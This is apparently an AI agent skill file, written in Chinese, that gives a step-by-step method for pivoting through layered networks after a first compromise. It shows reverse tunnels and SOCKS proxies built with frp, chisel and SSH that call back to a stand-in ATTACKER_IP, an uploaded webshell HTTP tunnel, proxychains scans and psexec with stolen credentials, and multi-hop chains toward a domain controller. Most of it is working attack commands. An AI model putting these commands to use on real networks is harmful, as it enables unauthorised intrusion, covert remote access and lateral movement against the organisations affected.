---
name: multi-layer-network
description: "多层网络渗透与隧道搭建。当需要从 DMZ 跳转到内网、跨网段渗透、或目标在多层防火墙/网络分区后面时使用。覆盖代理搭建(frp/chisel/SSH)、多跳隧道链、端口转发、SOCKS 代理。从边界突破到域控的完整多层攻击路径"
metadata:
  tags: "pivot,proxy,tunnel,multi-layer,lateral,隧道,代理,端口转发,frp,chisel,ssh,socks,内网穿透,跳板"
  difficulty: "hard"
  icon: "🌐"
  category: "横向移动"
---

# 多层网络渗透方法论

真实内网通常有多个网络分区：DMZ → 办公网 → 服务器区 → 核心域。每跳需要搭建隧道，通过代理链层层深入。

## Phase 1: 边界突破与立足点

### 1.1 获取第一个 Shell
通过 Web 漏洞/弱密码/CVE 获取 DMZ 主机的访问权限后，立即收集网络信息：

```bash
# 双网卡？路由表？ARP 缓存？
ip addr && ip route && arp -a && cat /etc/hosts
# 或 Windows
ipconfig /all && route print && arp -a
```

**关键判断**：
- 双网卡（如 eth0=外网, eth1=10.x.x.x）→ 这台机器就是天然跳板
- 只有内网 IP → 需要从当前 webshell 搭建反向隧道

### 1.2 目标网络测绘
确定内网可达范围：
```bash
# 快速存活探测
for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i &>/dev/null && echo "10.0.0.$i alive"; done
# 或用 fscan
fscan -h 10.0.0.0/24 -nopoc
```

## Phase 2: 隧道搭建

根据目标出网情况选择隧道方案：

### 2.1 目标可出网 → 正向代理

**frp（最稳定，推荐）**：
```bash
# 攻击者：启动 frps
frps -c frps.ini
# frps.ini: [common] bind_port = 7000

# 目标：上传并启动 frpc
frpc -c frpc.ini
# frpc.ini:
# [common]
# server_addr = ATTACKER_IP
# server_port = 7000
# [socks5]
# type = tcp
# remote_port = 1080
# plugin = socks5
```
攻击者本地 1080 端口即为内网 SOCKS5 代理。

**chisel（单二进制，部署方便）**：
```bash
# 攻击者
chisel server --reverse --port 8080
# 目标
chisel client ATTACKER_IP:8080 R:1080:socks
```

### 2.2 目标不出网 → 反向隧道 / HTTP 隧道

**Neo-reGeorg（HTTP 隧道，过防火墙）**：
适合只有 Web 端口出网的场景：
```bash
# 生成 webshell 隧道文件
python neoreg.py generate -k PASSWORD
# 上传 tunnel.php 到 Web 目录
# 攻击者连接
python neoreg.py -k PASSWORD -u http://target/tunnel.php -p 1080
```

**SSH 反向隧道**：
```bash
# 从目标反向连接到攻击者
ssh -R 1080 attacker@ATTACKER_IP  # 在攻击者上建立 SOCKS
```

### 2.3 SSH 隧道（最简单，有 SSH 凭据时优先）
```bash
# 动态 SOCKS 代理（一条命令搞定）
ssh -D 1080 -N -f user@JUMPBOX

# 本地端口转发（访问内网特定服务）
ssh -L 3389:INTERNAL_HOST:3389 -N -f user@JUMPBOX
# 然后 rdesktop 127.0.0.1:3389

# 远程端口转发（把内网服务暴露到攻击者）
ssh -R 8888:INTERNAL_HOST:80 -N -f user@JUMPBOX
```

## Phase 3: 通过代理操作内网

### 3.1 配置 proxychains
```bash
# /etc/proxychains4.conf
# 末尾添加：
socks5 127.0.0.1 1080
```

### 3.2 通过代理执行工具
```bash
# 内网扫描
proxychains nmap -sT -Pn -p 22,80,445,3389 10.0.0.0/24

# 域枚举
proxychains netexec smb 10.0.0.0/24 -u USER -p PASS

# Web 访问
proxychains curl http://10.0.0.100/

# impacket 工具
proxychains impacket-psexec DOMAIN/admin:pass@10.0.0.1
```

注意：proxychains 只支持 TCP，不支持 ICMP（ping 不可用，nmap 用 `-Pn -sT`）。

## Phase 4: 多跳代理链

当目标在第三层网络时（攻击者 → DMZ → 内网A → 内网B）：

### 4.1 两层隧道
```
攻击者 ←[frp/chisel]→ DMZ跳板(10.0.0.5) ←[SSH/frp]→ 内网A主机(172.16.0.10) → 目标网段(192.168.x.x)
```

**方法一：链式 SSH**
```bash
ssh -J user1@DMZ,user2@10.0.0.5 user3@172.16.0.10
```

**方法二：链式 SOCKS**
```bash
# 第一层：DMZ → 攻击者 SOCKS :1080
ssh -D 1080 user@DMZ
# 第二层：通过第一层代理建立到内网A的隧道
proxychains ssh -D 1081 user@10.0.0.5
# proxychains.conf 改为 socks5 127.0.0.1 1081 访问最深层
```

**方法三：frp 级联**
在每一跳上部署 frpc，层层转发到攻击者的 frps。

## Phase 5: 深层渗透

通过代理进入内网后，按优先级：
1. **内网侦察** → 参考 `internal-recon` 技能
2. **域环境攻击** → 参考 `ad-domain-attack` 技能
3. **凭据喷洒** → 参考 `cred-spray` 技能（postexploit）
4. **横向移动** → 参考 `lateral-movement` 技能（postexploit）

## 隧道工具选择速查

| 场景 | 推荐工具 | 原因 |
|------|----------|------|
| 有 SSH 凭据 | SSH 隧道 | 零部署，最简单 |
| 目标出网 + 长期使用 | frp | 最稳定，支持断线重连 |
| 目标出网 + 快速部署 | chisel | 单二进制，无配置文件 |
| 仅 HTTP 出网 | Neo-reGeorg | HTTP 隧道穿越防火墙 |
| 高性能需求 | ligolo-ng | TUN 接口，接近原生性能 |
| Windows 环境 | Stowaway | 跨平台，多跳支持 |

## 注意事项
- 隧道建立后先测试连通性（`proxychains curl`）再做大范围扫描
- 代理流量会增加延迟——扫描时减少并发、增加超时
- 隧道进程容易中断，用 `autossh` 或 frp 的断线重连保持稳定
- 记录每一跳的凭据和隧道命令，便于重建
